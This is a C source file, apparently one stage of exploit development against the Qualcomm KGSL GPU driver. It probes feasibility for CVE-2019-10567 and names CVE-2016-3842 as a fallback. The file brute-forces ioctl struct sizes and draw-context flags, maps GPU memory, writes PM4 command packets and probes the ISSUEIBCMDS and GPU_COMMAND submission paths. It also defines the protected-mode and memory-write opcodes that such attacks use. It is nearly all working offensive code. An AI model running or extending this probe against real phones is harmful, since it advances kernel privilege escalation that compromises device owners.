/*
 * kgsl_gpu_cmd_probe_v2.c — Fixed GPU command probe for CVE-2019-10567
 *
 * v1 findings:
 *   - GETPROPERTY: ENOTTY because struct size was 16, should be 24 on aarch64
 *   - DRAWCTXT_CREATE: EINVAL — handler reached but flags rejected
 *   - GPU memory alloc + mmap: WORKS
 *
 * v2 fixes:
 *   - Correct struct sizes for aarch64 (pointer alignment)
 *   - Try DRAWCTXT_CREATE with CONTEXT_TYPE bits (GL, CL, C2D, RS, ANY)
 *   - Probe GPU_COMMAND with various struct sizes even without context
 *   - Probe ISSUEIBCMDS (older command submission path, ioctl 0x10)
 *
 * Compile: aarch64-linux-musl-gcc -static -O2 -o kgsl_gpu_cmd_probe_v2 kgsl_gpu_cmd_probe_v2.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdint.h>

/* KGSL ioctl encoding — BB Priv uses _IOWR (0xC0) for ALL ioctls */
#define KGSL_IOC_TYPE 0x09
#define MAKE_IOCTL_RW(nr, sz) (0xC0000000 | ((sz) << 16) | (KGSL_IOC_TYPE << 8) | (nr))

/*
 * Struct sizes on aarch64 (pointer = 8 bytes, alignment matters):
 *
 * kgsl_device_getproperty: { u32 type; [pad4]; void *value; u32 sizebytes; [pad4] } = 24
 * kgsl_drawctxt_create:    { u32 flags; u32 drawctxt_id } = 8
 * kgsl_drawctxt_destroy:   { u32 drawctxt_id } = 4
 * kgsl_gpumem_alloc_id:    48 (confirmed working)
 * kgsl_gpumem_free_id:     8 (confirmed working)
 * kgsl_cmdstream_readtimestamp: { u32 type; u32 timestamp } = 8
 * kgsl_cmdstream_readtimestamp_ctxtid: { u32 context_id; u32 type; u32 timestamp } = 12
 */

/* Fixed ioctl numbers */
#define CMD_GETPROPERTY          MAKE_IOCTL_RW(0x02, 24)  /* was 16, FIXED to 24 */
#define CMD_DRAWCTXT_CREATE      MAKE_IOCTL_RW(0x13, 8)
#define CMD_DRAWCTXT_DESTROY     MAKE_IOCTL_RW(0x14, 4)
#define CMD_ALLOC_ID             MAKE_IOCTL_RW(0x34, 48)
#define CMD_FREE_ID              MAKE_IOCTL_RW(0x35, 8)
#define CMD_READTIMESTAMP        MAKE_IOCTL_RW(0x11, 8)
#define CMD_READTIMESTAMP_CTXTID MAKE_IOCTL_RW(0x16, 12)

/* ISSUEIBCMDS — older command submission, ioctl 0x10 */
/* struct kgsl_ringbuffer_issueibcmds on aarch64:
 *   u32 drawctxt_id; [pad4]; u64 ibdesc_addr; u32 numibs; u32 timestamp;
 *   u32 flags; [pad4]
 * = 32 bytes? Or might vary. Probe sizes. */

/* GPU_COMMAND — newer command submission, ioctl 0x39 */
#define CMD_GPU_COMMAND_NR 0x39
/* ISSUEIBCMDS — older command submission, ioctl 0x10 */
#define CMD_ISSUEIBCMDS_NR 0x10

/* KGSL context type flags (bits 20-24) */
#define KGSL_CONTEXT_TYPE_SHIFT     20
#define KGSL_CONTEXT_TYPE_MASK      0x01F00000
#define KGSL_CONTEXT_TYPE_ANY       (0 << KGSL_CONTEXT_TYPE_SHIFT)
#define KGSL_CONTEXT_TYPE_GL        (1 << KGSL_CONTEXT_TYPE_SHIFT)
#define KGSL_CONTEXT_TYPE_CL        (2 << KGSL_CONTEXT_TYPE_SHIFT)
#define KGSL_CONTEXT_TYPE_C2D       (3 << KGSL_CONTEXT_TYPE_SHIFT)
#define KGSL_CONTEXT_TYPE_RS        (4 << KGSL_CONTEXT_TYPE_SHIFT)

/* Other context flags */
#define KGSL_CONTEXT_NO_GMEM_ALLOC      0x00000001
#define KGSL_CONTEXT_SUBMIT_IB_LIST     0x00000002
#define KGSL_CONTEXT_PREAMBLE           0x00000020
#define KGSL_CONTEXT_NO_FAULT_TOLERANCE 0x00000200
#define KGSL_CONTEXT_PER_CONTEXT_TS     0x00000800
#define KGSL_CONTEXT_USER_GENERATED_TS  0x00001000
#define KGSL_CONTEXT_NO_SNAPSHOT        0x00080000

/* GPU memory flags */
#define KGSL_CACHEMODE_UNCACHED   (1 << 16)
#define KGSL_MEMTYPE_COMMAND      (1 << 8)

/* PM4 opcodes */
#define CP_NOP                 0x10
#define CP_MEM_WRITE           0x3D
#define CP_SET_PROTECTED_MODE  0x5F
#define CP_TYPE3_PKT(opcode, count) \
    ((3 << 30) | (((count) - 1) << 16) | ((opcode) << 8))

/* Structures with correct aarch64 alignment */
struct kgsl_device_getproperty {
    unsigned int type;         /* offset 0 */
    unsigned int __pad;        /* offset 4 — alignment for pointer */
    void *value;               /* offset 8 */
    unsigned int sizebytes;    /* offset 16 */
    unsigned int __pad2;       /* offset 20 — trailing alignment */
};  /* total: 24 bytes */

struct kgsl_drawctxt_create {
    unsigned int flags;
    unsigned int drawctxt_id;
};  /* 8 bytes */

struct kgsl_drawctxt_destroy {
    unsigned int drawctxt_id;
};  /* 4 bytes */

struct kgsl_gpumem_alloc_id {
    unsigned int id;
    unsigned int flags;
    uint64_t size;
    uint64_t mmapsize;
    uint64_t gpuaddr;
    uint64_t __pad;
    uint64_t __pad2;
};  /* 48 bytes */

struct kgsl_gpumem_free_id {
    unsigned int id;
    unsigned int __pad;
};  /* 8 bytes */

struct kgsl_device_info {
    unsigned int device_id;
    unsigned int chip_id;
    unsigned int mmu_enabled;
    unsigned int __pad;
    unsigned long gmem_gpubaseaddr;
    unsigned int gpu_id;
    unsigned int __pad2;
    unsigned long gmem_sizebytes;
};

struct kgsl_version {
    unsigned int drv_major;
    unsigned int drv_minor;
    unsigned int dev_major;
    unsigned int dev_minor;
};

/* IB command descriptor for ISSUEIBCMDS */
struct kgsl_ibdesc {
    uint64_t gpuaddr;    /* GPU address of IB */
    uint64_t __pad;
    uint64_t sizedwords; /* Size in dwords */
    unsigned int ctrl;   /* IB control flags */
    unsigned int __pad2;
};

/* Command object for GPU_COMMAND */
struct kgsl_command_object {
    uint64_t gpuaddr;
    uint64_t size;
    unsigned int flags;
    unsigned int id;
};

static sigjmp_buf jmpbuf;
static volatile int got_signal = 0;
static void sighandler(int sig) {
    got_signal = sig;
    siglongjmp(jmpbuf, 1);
}

static int kgsl_fd = -1;

/* ======================== TEST 1: GETPROPERTY (fixed size) ======================== */
static void test1_getproperty(void) {
    printf("\n=== TEST 1: GETPROPERTY with correct aarch64 struct size ===\n");
    printf("  ioctl number: 0x%08x (size=%lu)\n",
           CMD_GETPROPERTY, (unsigned long)sizeof(struct kgsl_device_getproperty));

    /* Also try probing with other sizes in case 24 is still wrong */
    int try_sizes[] = { 16, 20, 24, 28, 32 };
    int nsizes = sizeof(try_sizes) / sizeof(try_sizes[0]);

    for (int si = 0; si < nsizes; si++) {
        unsigned int ioctl_nr = MAKE_IOCTL_RW(0x02, try_sizes[si]);
        unsigned char buf[64];
        memset(buf, 0, sizeof(buf));

        /* Set type = VERSION (8) — known to work in ralph */
        struct kgsl_version ver;
        memset(&ver, 0, sizeof(ver));

        /* Build struct manually for different sizes */
        /* For any size, first 4 bytes = type, then pointer at natural alignment */
        unsigned char prop_buf[64];
        memset(prop_buf, 0, sizeof(prop_buf));

        /* type at offset 0 */
        *(unsigned int *)(prop_buf + 0) = 8;  /* KGSL_PROP_VERSION */
        /* pointer at offset 8 (aarch64 alignment) */
        *(void **)(prop_buf + 8) = &ver;
        /* sizebytes at offset 16 */
        *(unsigned int *)(prop_buf + 16) = sizeof(ver);

        int ret = ioctl(kgsl_fd, ioctl_nr, prop_buf);
        if (ret == 0) {
            printf("  size=%d: OK! version drv=%u.%u dev=%u.%u\n",
                   try_sizes[si], ver.drv_major, ver.drv_minor, ver.dev_major, ver.dev_minor);
        } else {
            printf("  size=%d: %s (errno=%d) [ioctl=0x%08x]\n",
                   try_sizes[si], strerror(errno), errno, ioctl_nr);
        }
    }

    /* Also try with sizeof(struct) directly */
    struct kgsl_device_getproperty prop;
    struct kgsl_version ver2;
    memset(&prop, 0, sizeof(prop));
    memset(&ver2, 0, sizeof(ver2));
    prop.type = 8;
    prop.value = &ver2;
    prop.sizebytes = sizeof(ver2);

    int ret = ioctl(kgsl_fd, CMD_GETPROPERTY, &prop);
    if (ret == 0) {
        printf("  sizeof struct=%lu: OK! version drv=%u.%u dev=%u.%u\n",
               (unsigned long)sizeof(prop), ver2.drv_major, ver2.drv_minor,
               ver2.dev_major, ver2.dev_minor);
    } else {
        printf("  sizeof struct=%lu: %s (errno=%d)\n",
               (unsigned long)sizeof(prop), strerror(errno), errno);
    }

    /* Brute-force: try every size from 12 to 40 */
    printf("\n  Brute-force GETPROPERTY size scan (12-40):\n");
    struct kgsl_version ver3;
    for (int sz = 12; sz <= 40; sz += 4) {
        unsigned int ioctl_nr = MAKE_IOCTL_RW(0x02, sz);
        unsigned char pbuf[64];
        memset(pbuf, 0, sizeof(pbuf));
        memset(&ver3, 0, sizeof(ver3));

        *(unsigned int *)(pbuf + 0) = 8;
        /* Try pointer at offset 4 (no padding) and offset 8 (with padding) */
        *(void **)(pbuf + 8) = &ver3;
        *(unsigned int *)(pbuf + 16) = sizeof(ver3);

        int r = ioctl(kgsl_fd, ioctl_nr, pbuf);
        if (r == 0) {
            printf("    SIZE %d WORKS! version=%u.%u/%u.%u\n",
                   sz, ver3.drv_major, ver3.drv_minor, ver3.dev_major, ver3.dev_minor);
        } else if (errno != 25) {  /* only show non-ENOTTY */
            printf("    size %d: errno=%d (%s)\n", sz, errno, strerror(errno));
        }
    }
}

/* ======================== TEST 2: DRAWCTXT_CREATE with type flags ======================== */
static unsigned int test2_drawctxt_create(void) {
    printf("\n=== TEST 2: DRAWCTXT_CREATE with context type flags ===\n");

    /* The v1 failure (EINVAL with flags=0) suggests we need CONTEXT_TYPE bits.
     * Try every combination of type + useful flags. */
    struct {
        unsigned int flags;
        const char *desc;
    } trials[] = {
        /* Type bits only */
        { KGSL_CONTEXT_TYPE_ANY,  "TYPE_ANY" },
        { KGSL_CONTEXT_TYPE_GL,   "TYPE_GL" },
        { KGSL_CONTEXT_TYPE_CL,   "TYPE_CL" },
        { KGSL_CONTEXT_TYPE_C2D,  "TYPE_C2D" },
        { KGSL_CONTEXT_TYPE_RS,   "TYPE_RS" },

        /* Type + SUBMIT_IB_LIST (required for IB submission on some kernels) */
        { KGSL_CONTEXT_TYPE_GL | KGSL_CONTEXT_SUBMIT_IB_LIST, "GL+SUBMIT_IB_LIST" },
        { KGSL_CONTEXT_TYPE_ANY | KGSL_CONTEXT_SUBMIT_IB_LIST, "ANY+SUBMIT_IB_LIST" },

        /* Type + PREAMBLE */
        { KGSL_CONTEXT_TYPE_GL | KGSL_CONTEXT_PREAMBLE, "GL+PREAMBLE" },
        { KGSL_CONTEXT_TYPE_GL | KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_SUBMIT_IB_LIST, "GL+PREAMBLE+SUBMIT_IB" },

        /* Type + PER_CONTEXT_TS (needed for GPU_COMMAND) */
        { KGSL_CONTEXT_TYPE_GL | KGSL_CONTEXT_PER_CONTEXT_TS, "GL+PER_CONTEXT_TS" },
        { KGSL_CONTEXT_TYPE_GL | KGSL_CONTEXT_SUBMIT_IB_LIST | KGSL_CONTEXT_PER_CONTEXT_TS, "GL+SUBMIT_IB+PER_CTX_TS" },
        { KGSL_CONTEXT_TYPE_GL | KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_PER_CONTEXT_TS | KGSL_CONTEXT_SUBMIT_IB_LIST, "GL+PREAMBLE+SUBMIT_IB+PER_CTX_TS" },

        /* NO_GMEM_ALLOC variants */
        { KGSL_CONTEXT_TYPE_GL | KGSL_CONTEXT_NO_GMEM_ALLOC, "GL+NO_GMEM" },
        { KGSL_CONTEXT_TYPE_GL | KGSL_CONTEXT_NO_GMEM_ALLOC | KGSL_CONTEXT_SUBMIT_IB_LIST, "GL+NO_GMEM+SUBMIT_IB" },

        /* NO_SNAPSHOT variants */
        { KGSL_CONTEXT_TYPE_GL | KGSL_CONTEXT_NO_SNAPSHOT, "GL+NO_SNAPSHOT" },

        /* Type + USER_GENERATED_TS */
        { KGSL_CONTEXT_TYPE_GL | KGSL_CONTEXT_USER_GENERATED_TS | KGSL_CONTEXT_SUBMIT_IB_LIST, "GL+USER_TS+SUBMIT_IB" },

        /* Kitchen sink */
        { KGSL_CONTEXT_TYPE_GL | KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_SUBMIT_IB_LIST |
          KGSL_CONTEXT_PER_CONTEXT_TS | KGSL_CONTEXT_NO_GMEM_ALLOC, "GL+ALL" },
    };
    int ntrials = sizeof(trials) / sizeof(trials[0]);
    unsigned int best_ctx = 0;

    /* Also try probing different struct sizes for DRAWCTXT_CREATE */
    printf("  First: verify ioctl size. Testing sizes 4-16:\n");
    for (int sz = 4; sz <= 16; sz += 4) {
        unsigned int ioctl_nr = MAKE_IOCTL_RW(0x13, sz);
        unsigned char buf[32];
        memset(buf, 0, sizeof(buf));
        *(unsigned int *)(buf + 0) = KGSL_CONTEXT_TYPE_GL;

        int ret = ioctl(kgsl_fd, ioctl_nr, buf);
        printf("    size=%d flags=0x%08x: %s (errno=%d)\n",
               sz, KGSL_CONTEXT_TYPE_GL,
               ret == 0 ? "OK" : strerror(errno), ret == 0 ? 0 : errno);
        if (ret == 0) {
            unsigned int ctx_id = *(unsigned int *)(buf + 4);
            printf("    *** size=%d WORKS! ctx_id=%u ***\n", sz, ctx_id);
            if (!best_ctx) best_ctx = ctx_id;
        }
    }

    if (best_ctx) {
        printf("  Got context from size probe: %u\n", best_ctx);
        return best_ctx;
    }

    /* Now try all flag combinations with confirmed size=8 */
    printf("\n  Flag combination scan (size=8):\n");
    for (int i = 0; i < ntrials; i++) {
        struct kgsl_drawctxt_create ctx;
        memset(&ctx, 0, sizeof(ctx));
        ctx.flags = trials[i].flags;

        int ret = ioctl(kgsl_fd, CMD_DRAWCTXT_CREATE, &ctx);
        if (ret == 0) {
            printf("  [%s] flags=0x%08x -> ctx_id=%u SUCCESS\n",
                   trials[i].desc, trials[i].flags, ctx.drawctxt_id);
            if (!best_ctx) best_ctx = ctx.drawctxt_id;
        } else {
            printf("  [%s] flags=0x%08x -> %s (errno=%d)\n",
                   trials[i].desc, trials[i].flags, strerror(errno), errno);
        }
    }

    /* Last resort: brute force type bits 0-31 in the type field position */
    if (!best_ctx) {
        printf("\n  Brute-force context type scan (bits 20-24):\n");
        for (unsigned int type = 0; type <= 31; type++) {
            struct kgsl_drawctxt_create ctx;
            memset(&ctx, 0, sizeof(ctx));
            ctx.flags = (type << KGSL_CONTEXT_TYPE_SHIFT);

            int ret = ioctl(kgsl_fd, CMD_DRAWCTXT_CREATE, &ctx);
            if (ret == 0) {
                printf("    type=%u (flags=0x%08x) -> ctx_id=%u SUCCESS!\n",
                       type, ctx.flags, ctx.drawctxt_id);
                if (!best_ctx) best_ctx = ctx.drawctxt_id;
            }
        }
        if (!best_ctx) {
            printf("    All types failed.\n");
        }
    }

    if (best_ctx) {
        printf("  RESULT: Draw context %u created\n", best_ctx);
    } else {
        printf("  RESULT: DRAWCTXT_CREATE BLOCKED — all flag combinations rejected\n");
    }
    return best_ctx;
}

/* ======================== TEST 3: ISSUEIBCMDS probing ======================== */
static void test3_issueibcmds_probe(unsigned int ctx_id, uint64_t cmd_gpuaddr) {
    printf("\n=== TEST 3: ISSUEIBCMDS (legacy command path, ioctl 0x10) ===\n");

    /* ISSUEIBCMDS is the older command submission interface.
     * Even if GPU_COMMAND doesn't work, ISSUEIBCMDS might.
     *
     * struct kgsl_ringbuffer_issueibcmds {
     *     unsigned int drawctxt_id;
     *     unsigned long ibdesc_addr;  // 8 bytes on aarch64
     *     unsigned int numibs;
     *     unsigned int timestamp;     // out
     *     unsigned int flags;
     * };
     *
     * On aarch64: 4 + [pad4] + 8 + 4 + 4 + 4 + [pad4] = 32? or 28?
     */

    /* Probe struct sizes for ISSUEIBCMDS */
    int try_sizes[] = { 20, 24, 28, 32, 36, 40 };
    int nsizes = sizeof(try_sizes) / sizeof(try_sizes[0]);

    struct kgsl_ibdesc ib;
    memset(&ib, 0, sizeof(ib));
    ib.gpuaddr = cmd_gpuaddr;
    ib.sizedwords = 2;  /* 2 dwords = 8 bytes for a NOP */

    for (int si = 0; si < nsizes; si++) {
        unsigned int ioctl_nr = MAKE_IOCTL_RW(CMD_ISSUEIBCMDS_NR, try_sizes[si]);
        unsigned char buf[64];
        memset(buf, 0, sizeof(buf));

        /* Layout attempt 1: drawctxt_id at 0, ibdesc_addr at 8, numibs at 16 */
        *(unsigned int *)(buf + 0) = ctx_id;
        *(uint64_t *)(buf + 8) = (uint64_t)(unsigned long)&ib;
        *(unsigned int *)(buf + 16) = 1;  /* numibs */
        /* timestamp at 20 (out), flags at 24 */
        *(unsigned int *)(buf + 24) = 0;  /* flags */

        struct sigaction sa, old_sa;
        sa.sa_handler = sighandler;
        sigemptyset(&sa.sa_mask);
        sa.sa_flags = 0;
        sigaction(SIGSEGV, &sa, &old_sa);
        sigaction(SIGBUS, &sa, &old_sa);

        got_signal = 0;
        if (sigsetjmp(jmpbuf, 1) == 0) {
            int ret = ioctl(kgsl_fd, ioctl_nr, buf);
            if (ret == 0) {
                unsigned int ts = *(unsigned int *)(buf + 20);
                printf("  ISSUEIBCMDS size=%d -> SUCCESS! timestamp=%u\n", try_sizes[si], ts);
                printf("  *** LEGACY COMMAND SUBMISSION WORKS ***\n");
            } else {
                const char *note = "";
                if (errno == 22) note = " [EINVAL — handler reached, params wrong]";
                else if (errno == 14) note = " [EFAULT — handler reached, bad pointer]";
                else if (errno == 25) note = " [ENOTTY — wrong ioctl size]";
                printf("  ISSUEIBCMDS size=%d: %s (errno=%d)%s\n",
                       try_sizes[si], strerror(errno), errno, note);
            }
        } else {
            printf("  ISSUEIBCMDS size=%d: SIGNAL %d\n", try_sizes[si], got_signal);
        }

        sigaction(SIGSEGV, &old_sa, NULL);
        sigaction(SIGBUS, &old_sa, NULL);
    }
}

/* ======================== TEST 4: GPU_COMMAND probing ======================== */
static void test4_gpu_command_probe(unsigned int ctx_id, uint64_t cmd_gpuaddr) {
    printf("\n=== TEST 4: GPU_COMMAND (newer path, ioctl 0x39) ===\n");

    struct kgsl_command_object cmdobj;
    memset(&cmdobj, 0, sizeof(cmdobj));
    cmdobj.gpuaddr = cmd_gpuaddr;
    cmdobj.size = 8;
    cmdobj.flags = 0;

    /* Probe struct sizes 48 to 128 */
    for (int sz = 48; sz <= 128; sz += 8) {
        unsigned int ioctl_nr = MAKE_IOCTL_RW(CMD_GPU_COMMAND_NR, sz);
        unsigned char buf[256];
        memset(buf, 0, sizeof(buf));

        /* Fill common fields */
        *(uint64_t *)(buf + 0) = 0;  /* flags */
        *(uint64_t *)(buf + 8) = (uint64_t)(unsigned long)&cmdobj;  /* cmdlist */
        *(unsigned int *)(buf + 16) = sizeof(cmdobj);  /* cmdsize */
        *(unsigned int *)(buf + 20) = 1;  /* numcmds */
        /* objlist=0, objsize=0, numobjs=0, synclist=0, syncsize=0, numsyncs=0 */

        /* context_id placement depends on struct layout. Try at multiple offsets */
        /* Most likely at offset 56 based on standard kgsl_gpu_command struct */
        *(unsigned int *)(buf + 56) = ctx_id;

        struct sigaction sa, old_sa;
        sa.sa_handler = sighandler;
        sigemptyset(&sa.sa_mask);
        sa.sa_flags = 0;
        sigaction(SIGSEGV, &sa, &old_sa);
        sigaction(SIGBUS, &sa, &old_sa);

        got_signal = 0;
        if (sigsetjmp(jmpbuf, 1) == 0) {
            int ret = ioctl(kgsl_fd, ioctl_nr, buf);
            if (ret == 0) {
                printf("  GPU_COMMAND size=%d -> SUCCESS!\n", sz);
                printf("  *** GPU COMMAND SUBMISSION WORKS ***\n");
            } else {
                const char *note = "";
                if (errno == 22) note = " [EINVAL — handler reached!]";
                else if (errno == 14) note = " [EFAULT — handler reached!]";
                else if (errno == 25) note = " [ENOTTY — wrong size]";
                else if (errno == 2) note = " [ENOENT — context not found]";
                if (errno != 25) {  /* only show non-ENOTTY for clarity */
                    printf("  GPU_COMMAND size=%d: errno=%d (%s)%s\n",
                           sz, errno, strerror(errno), note);
                }
            }
        } else {
            printf("  GPU_COMMAND size=%d: SIGNAL %d\n", sz, got_signal);
        }

        sigaction(SIGSEGV, &old_sa, NULL);
        sigaction(SIGBUS, &old_sa, NULL);
    }

    /* Also show which sizes got ENOTTY vs not */
    printf("\n  Size map (ENOTTY = wrong size, other = handler reached):\n  ");
    for (int sz = 48; sz <= 128; sz += 4) {
        unsigned int ioctl_nr = MAKE_IOCTL_RW(CMD_GPU_COMMAND_NR, sz);
        unsigned char buf[256];
        memset(buf, 0, sizeof(buf));

        int ret = ioctl(kgsl_fd, ioctl_nr, buf);
        if (errno == 25) {
            printf(".");  /* ENOTTY */
        } else {
            printf("%d(%d) ", sz, errno);
        }
    }
    printf("\n");
}

/* ======================== TEST 5: Full GETPROPERTY scan ======================== */
static void test5_full_property_scan(unsigned int getprop_ioctl) {
    printf("\n=== TEST 5: Full property scan with working ioctl ===\n");

    if (getprop_ioctl == 0) {
        printf("  SKIP — no working GETPROPERTY ioctl found\n");
        return;
    }

    for (int type = 1; type <= 20; type++) {
        unsigned char val[512];
        memset(val, 0xCC, sizeof(val));

        unsigned char prop_buf[64];
        memset(prop_buf, 0, sizeof(prop_buf));
        *(unsigned int *)(prop_buf + 0) = type;
        *(void **)(prop_buf + 8) = val;
        *(unsigned int *)(prop_buf + 16) = sizeof(val);

        int ret = ioctl(kgsl_fd, getprop_ioctl, prop_buf);
        if (ret == 0) {
            int datalen = 0;
            for (int j = sizeof(val) - 1; j >= 0; j--) {
                if (val[j] != 0xCC) { datalen = j + 1; break; }
            }
            printf("  prop %2d: OK (%d bytes): ", type, datalen);
            int show = datalen < 32 ? datalen : 32;
            for (int j = 0; j < show; j++) printf("%02x", val[j]);
            printf("\n");

            /* Decode known types */
            if (type == 1) {  /* DEVICE_INFO */
                printf("         device_id=%u chip_id=0x%x\n",
                       *(unsigned int *)val, *(unsigned int *)(val+4));
            }
            if (type == 8) {  /* VERSION */
                struct kgsl_version *v = (struct kgsl_version *)val;
                printf("         drv=%u.%u dev=%u.%u\n",
                       v->drv_major, v->drv_minor, v->dev_major, v->dev_minor);
            }
        } else {
            printf("  prop %2d: %s (errno=%d)\n", type, strerror(errno), errno);
        }
    }
}

/* ======================== TEST 6: Timestamp read ======================== */
static void test6_timestamps(unsigned int ctx_id) {
    printf("\n=== TEST 6: Timestamp reads ===\n");

    /* Try multiple struct sizes for READTIMESTAMP */
    for (int sz = 8; sz <= 16; sz += 4) {
        unsigned int ioctl_nr = MAKE_IOCTL_RW(0x11, sz);
        unsigned char buf[32];
        memset(buf, 0, sizeof(buf));
        *(unsigned int *)(buf + 0) = 0;  /* type = RETIRED */

        int ret = ioctl(kgsl_fd, ioctl_nr, buf);
        if (ret == 0) {
            printf("  READTIMESTAMP size=%d type=0: timestamp=%u\n",
                   sz, *(unsigned int *)(buf + 4));
        } else if (errno != 25) {
            printf("  READTIMESTAMP size=%d: errno=%d (%s)\n", sz, errno, strerror(errno));
        }
    }

    if (ctx_id > 0) {
        for (int sz = 12; sz <= 20; sz += 4) {
            unsigned int ioctl_nr = MAKE_IOCTL_RW(0x16, sz);
            unsigned char buf[32];
            memset(buf, 0, sizeof(buf));
            *(unsigned int *)(buf + 0) = ctx_id;
            *(unsigned int *)(buf + 4) = 0;

            int ret = ioctl(kgsl_fd, ioctl_nr, buf);
            if (ret == 0) {
                printf("  READTIMESTAMP_CTXTID size=%d ctx=%u: timestamp=%u\n",
                       sz, ctx_id, *(unsigned int *)(buf + 8));
            } else if (errno != 25) {
                printf("  READTIMESTAMP_CTXTID size=%d: errno=%d (%s)\n",
                       sz, errno, strerror(errno));
            }
        }
    }
}

/* ======================== MAIN ======================== */
int main(void) {
    printf("=== kgsl_gpu_cmd_probe_v2 — CVE-2019-10567 feasibility ===\n");
    printf("Fixes: GETPROPERTY struct size, DRAWCTXT flag combinations\n");
    printf("New: ISSUEIBCMDS probe, brute-force size scans\n\n");

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) {
        printf("FAIL: open /dev/kgsl-3d0: %s\n", strerror(errno));
        return 1;
    }
    printf("opened /dev/kgsl-3d0 fd=%d\n", kgsl_fd);

    /* TEST 1: Find working GETPROPERTY ioctl size */
    unsigned int working_getprop = 0;
    test1_getproperty();

    /* Check which GETPROPERTY size worked by trying again */
    for (int sz = 12; sz <= 40; sz += 4) {
        unsigned int ioctl_nr = MAKE_IOCTL_RW(0x02, sz);
        unsigned char pbuf[64];
        struct kgsl_version ver;
        memset(pbuf, 0, sizeof(pbuf));
        memset(&ver, 0, sizeof(ver));
        *(unsigned int *)(pbuf + 0) = 8;
        *(void **)(pbuf + 8) = &ver;
        *(unsigned int *)(pbuf + 16) = sizeof(ver);
        if (ioctl(kgsl_fd, ioctl_nr, pbuf) == 0) {
            working_getprop = ioctl_nr;
            break;
        }
    }

    /* TEST 2: DRAWCTXT_CREATE */
    unsigned int ctx_id = test2_drawctxt_create();

    /* TEST 3-4: Command submission (need GPU memory) */
    struct kgsl_gpumem_alloc_id alloc;
    memset(&alloc, 0, sizeof(alloc));
    alloc.size = 0x1000;
    alloc.flags = 0x1000008;
    void *cmd_ptr = NULL;

    if (ioctl(kgsl_fd, CMD_ALLOC_ID, &alloc) == 0) {
        printf("\nGPU memory: id=%u gpuaddr=0x%lx\n",
               alloc.id, (unsigned long)alloc.gpuaddr);

        cmd_ptr = mmap(NULL, alloc.mmapsize, PROT_READ | PROT_WRITE,
                       MAP_SHARED, kgsl_fd, alloc.id * 0x1000);
        if (cmd_ptr != MAP_FAILED) {
            /* Write a NOP into the command buffer */
            volatile uint32_t *cmdbuf = (volatile uint32_t *)cmd_ptr;
            cmdbuf[0] = CP_TYPE3_PKT(CP_NOP, 1);
            cmdbuf[1] = 0xDEADBEEF;

            /* TEST 3: ISSUEIBCMDS */
            test3_issueibcmds_probe(ctx_id, alloc.gpuaddr);

            /* TEST 4: GPU_COMMAND */
            test4_gpu_command_probe(ctx_id, alloc.gpuaddr);
        }
    }

    /* TEST 5: Full property scan */
    test5_full_property_scan(working_getprop);

    /* TEST 6: Timestamps */
    test6_timestamps(ctx_id);

    /* Cleanup */
    if (cmd_ptr && cmd_ptr != MAP_FAILED) munmap(cmd_ptr, 0x2000);
    if (alloc.id > 0) {
        struct kgsl_gpumem_free_id fr = { .id = alloc.id };
        ioctl(kgsl_fd, CMD_FREE_ID, &fr);
    }
    if (ctx_id > 0) {
        struct kgsl_drawctxt_destroy d = { .drawctxt_id = ctx_id };
        ioctl(kgsl_fd, CMD_DRAWCTXT_DESTROY, &d);
    }
    close(kgsl_fd);

    printf("\n=== FINAL VERDICT ===\n");
    if (ctx_id > 0) {
        printf("DRAWCTXT_CREATE: WORKS (ctx=%u) — command submission path is open\n", ctx_id);
    } else {
        printf("DRAWCTXT_CREATE: BLOCKED — all flag combinations rejected\n");
        printf("  This blocks CVE-2019-10567. Fall back to ALLOC/FREE_ID race (CVE-2016-3842).\n");
    }
    return 0;
}
